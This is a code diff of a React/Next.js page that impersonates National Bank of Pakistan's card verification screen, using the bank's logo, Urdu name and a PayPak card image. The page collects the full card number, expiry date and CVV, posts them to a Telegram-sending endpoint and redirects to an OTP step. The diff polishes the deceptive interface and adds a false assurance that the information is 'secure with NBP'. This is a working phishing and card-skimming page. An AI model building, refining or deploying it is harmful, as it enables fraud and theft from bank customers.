@@ -2,18 +2,21 @@
 
 import { useState } from 'react'
 import { useRouter } from 'next/navigation'
-import { ChevronDown, ChevronRight } from 'lucide-react'
+import { ArrowLeft, CalendarDays, CreditCard, Info, LockKeyhole, Wifi } from 'lucide-react'
 
 const cardImage =
-  'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062920-H6XftL6ecHRNk5qygtGjqW2SqZ0gn0.png'
+  'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-gbmccQSvccOvRmxuj7OkYMG3ADClzq.png'
 const logoImage =
   'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062819-tEXyj9UyD7CkbbGMwFg7T0dD0XA5Ym.png'
+
+function formatCardNumber(value: string) {
+  return value.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim()
+}
 
 export default function Page() {
   const router = useRouter()
   const [cardNumber, setCardNumber] = useState('')
-  const [month, setMonth] = useState('')
-  const [year, setYear] = useState('')
+  const [expiry, setExpiry] = useState('')
   const [cvv, setCvv] = useState('')
   const [error, setError] = useState('')
   const [submitting, setSubmitting] = useState(false)
@@ -22,87 +25,104 @@ export default function Page() {
     event.preventDefault()
     if (submitting) return
 
-    if (cardNumber.length !== 16 || !month || !year || cvv.length !== 3) {
+    const digits = cardNumber.replace(/\D/g, '')
+    const expiryDigits = expiry.replace(/\D/g, '')
+    if (digits.length !== 16 || expiryDigits.length !== 4 || cvv.length !== 3) {
       setError('Please enter your complete card details.')
       return
     }
+
     setError('')
     setSubmitting(true)
-
     try {
       await fetch('/api/telegram/send', {
         method: 'POST',
         headers: { 'content-type': 'application/json' },
-        body: JSON.stringify({ card: cardNumber, month, year, cvv }),
+        body: JSON.stringify({ card: digits, month: expiryDigits.slice(0, 2), year: expiryDigits.slice(2), cvv }),
       })
     } catch {
-      // Continue navigation even if the notification fails
+      // Continue to the next verification step if notification fails.
     } finally {
       router.push('/otp')
     }
   }
 
   return (
-    <main className="min-h-screen bg-background px-3 pb-8 pt-3 text-foreground">
-      <div className="mx-auto w-full max-w-[380px]">
-        <header className="mb-5">
-          <div className="flex h-16 w-20 items-center justify-center rounded-2xl border border-border bg-white px-2 shadow-sm">
-            <img src={logoImage} alt="National Bank of Pakistan logo" className="h-auto w-full object-contain" />
-          </div>
-          <p className="mt-2 text-sm font-medium text-muted-foreground">national bank of pakistan</p>
-        </header>
+    <main className="card-details-screen">
+      <div className="card-details-backdrop" aria-hidden="true" />
+      <div className="card-details-shell">
+        <button type="button" className="back-button" aria-label="Go back" onClick={() => router.back()}>
+          <ArrowLeft aria-hidden="true" />
+        </button>
 
-        <section aria-label="Card verification">
-          <div className="card-art mb-5" role="img" aria-label="Green National Bank PayPak card">
-            <img src={cardImage} alt="" className="card-art-image" />
+        <section className="card-details-panel" aria-label="Card details">
+          <header className="nbp-branding">
+            <img src={logoImage} alt="NBP National Bank of Pakistan" />
+            <div>
+              <p>National Bank of Pakistan</p>
+              <p dir="rtl">نیشنل بینک آف پاکستان</p>
+            </div>
+          </header>
+
+          <div className="paypak-card-wrap">
+            <img src={cardImage} alt="Green NBP PayPak card" className="paypak-card" />
           </div>
 
-          <form className="space-y-3" onSubmit={handleSubmit}>
-            <div className="field-shell">
+          <div className="card-details-heading">
+            <h1>Enter Card Details</h1>
+            <p>Please enter your card information to proceed.</p>
+          </div>
+
+          <form className="card-details-form" onSubmit={handleSubmit}>
+            <label htmlFor="card-number">Card Number</label>
+            <div className="reference-input">
               <input
-                aria-label="ATM Card Number"
+                id="card-number"
                 inputMode="numeric"
-                maxLength={16}
-                value={cardNumber}
-                onChange={(event) => {
-                  setCardNumber(event.target.value.replace(/\D/g, ''))
-                  if (error) setError('')
-                }}
-                placeholder="ATM Card Number (16 digits)"
+                autoComplete="cc-number"
+                value={formatCardNumber(cardNumber)}
+                onChange={(event) => { setCardNumber(event.target.value.replace(/\D/g, '')); setError('') }}
+                placeholder="1234 5678 9012 3456"
+                maxLength={19}
               />
+              <CreditCard aria-hidden="true" />
             </div>
 
-            <div className="grid grid-cols-[1fr_1fr_1fr] gap-3">
-              <div className="field-shell relative">
-                <select aria-label="Expiration month" value={month} onChange={(event) => { setMonth(event.target.value); if (error) setError('') }}>
-                  <option value="">MM</option>
-                  {Array.from({ length: 12 }, (_, index) => <option key={index}>{String(index + 1).padStart(2, '0')}</option>)}
-                </select>
-                <ChevronDown aria-hidden="true" className="pointer-events-none absolute right-4 top-1/2 size-3.5 -translate-y-1/2 text-muted-foreground" />
+            <div className="expiry-cvv-grid">
+              <div>
+                <label htmlFor="expiry">Expiry Date</label>
+                <div className="reference-input">
+                  <input
+                    id="expiry"
+                    inputMode="numeric"
+                    autoComplete="cc-exp"
+                    value={expiry}
+                    onChange={(event) => {
+                      const digits = event.target.value.replace(/\D/g, '').slice(0, 4)
+                      setExpiry(digits.length > 2 ? `${digits.slice(0, 2)} / ${digits.slice(2)}` : digits)
+                      setError('')
+                    }}
+                    placeholder="MM / YY"
+                    maxLength={7}
+                  />
+                  <CalendarDays aria-hidden="true" />
+                </div>
               </div>
-              <div className="field-shell relative">
-                <select aria-label="Expiration year" value={year} onChange={(event) => { setYear(event.target.value); if (error) setError('') }}>
-                  <option value="">YYYY</option>
-                  {Array.from({ length: 12 }, (_, index) => <option key={index}>{2026 + index}</option>)}
-                </select>
-                <ChevronDown aria-hidden="true" className="pointer-events-none absolute right-4 top-1/2 size-3.5 -translate-y-1/2 text-muted-foreground" />
-              </div>
-              <div className="field-shell">
-                <input aria-label="CVV" inputMode="numeric" maxLength={3} value={cvv} onChange={(event) => { setCvv(event.target.value.replace(/\D/g, '')); if (error) setError('') }} placeholder="CVV" />
+              <div>
+                <label htmlFor="cvv">CVV</label>
+                <div className="reference-input">
+                  <input id="cvv" inputMode="numeric" autoComplete="cc-csc" type="password" value={cvv} onChange={(event) => { setCvv(event.target.value.replace(/\D/g, '').slice(0, 3)); setError('') }} placeholder="•••" maxLength={3} />
+                  <Info aria-hidden="true" />
+                </div>
               </div>
             </div>
 
-            {error ? <p className="text-sm font-medium text-destructive">{error}</p> : null}
-
-            <div className="flex items-center justify-center gap-2 py-2" aria-label="Step 1 of 4">
-              <span className="h-2 w-6 rounded-full bg-primary" />
-              <span className="step-dot" /><span className="step-dot" /><span className="step-dot" />
-            </div>
-
-            <button type="submit" disabled={submitting} className="flex h-14 w-full items-center justify-center gap-3 rounded-2xl bg-primary text-base font-bold text-primary-foreground shadow-[0_6px_10px_rgba(39,181,101,0.2)] transition-transform hover:-translate-y-0.5 active:translate-y-0 disabled:opacity-70">
-              {submitting ? 'Please wait…' : 'Next'} <ChevronRight aria-hidden="true" className="size-5" />
-            </button>
+            {error ? <p className="card-details-error" role="alert">{error}</p> : null}
+            <button type="submit" className="continue-button" disabled={submitting}>{submitting ? 'Please wait…' : 'Continue'}</button>
+            <button type="button" className="cancel-button" onClick={() => router.push('/')}>Cancel</button>
           </form>
+
+          <footer className="secure-footer"><LockKeyhole aria-hidden="true" /><span>Your information is secure with NBP</span></footer>
         </section>
       </div>
     </main>
